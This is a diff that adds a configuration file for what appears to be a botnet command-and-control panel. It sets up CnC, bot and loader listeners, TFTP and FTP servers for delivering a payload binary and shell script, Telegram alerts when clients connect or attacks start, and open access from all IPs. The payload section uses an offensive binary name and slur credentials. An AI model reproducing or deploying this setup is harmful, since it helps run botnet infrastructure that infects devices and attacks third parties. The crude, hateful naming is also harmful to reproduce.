@@ -1,0 +1,67 @@
+ImportTheme = "./themes/japan.toml"
+
+CncServer = "0.0.0.0:3399"
+BotServer = "127.0.0.1:3000" 
+LoaderServer = "0.0.0.0:12234"
+TftpServer = "0.0.0.0:12345"
+FtpServer = "0.0.0.0:2323"
+
+RootLogin = "root" 
+
+DISABLE_DEBUG = true
+
+[Monitor]
+UpdateTime = 500 # in ms
+OpenCmdLineKey = "ctrl+x"
+CloseMonitorKey = "ctrl+c"
+
+[Logging]
+    # WARNING|ERROR|INFO|DISCARD
+    LogLevel = "WARNING|ERROR|INFO"
+    InfoMessage =  "{custom(fg=90 bg=44 fgstyle=1)} [{date}] [INFO]{reset}{blue} {message}{reset}"
+    WarningMessage = "{custom(fg=90 bg=43 fgstyle=1)} [{date}] [WARNING]{reset}{yellow} {message}{reset}"
+    ErrorMessage =  "{custom(fg=90 bg=41 fgstyle=1)} [{date}] [ERROR]{reset}{red} {message}{reset}"
+
+
+[Logs]
+TelegramBotToken = "" # telegram bot token (@BotFather)
+TelegramChatId = "" # telegram chat id (account id/chat id)
+
+
+SaveLogsInFile = false
+SendLogsInTelegram =false
+PrintLogsInTerminal =false 
+
+NewClientConnectedLog = false
+NewAttackStartedLog = false
+
+# if SaveLogsInFile = true
+NewClientConnectedFileName = "logs/connections.txt" 
+NewAttackStartedFileName = "logs/attacks.txt"
+
+[Payload]
+    BinaryName = "pedo"
+    ShellName = "./bin/hi.sh"
+    FtpPassword = "gay"
+    FtpLogin = "gay"
+
+
+[Auth]
+AllowAllIps = true
+
+# MODULES
+
+[Captcha]
+    Enabled = false
+    CaptchaLen = 4
+    Letters = "123456789"
+
+[Animation]
+    Enabled = true
+    Letters = "CONTAGIO"
+    Delay = 500 # In milliseconds   
+
+[Modules.date] # custom module
+    Exec="date +%T"
+[Modules.GetSessions] 
+    Exec = "bash modules/get_connections.bash"
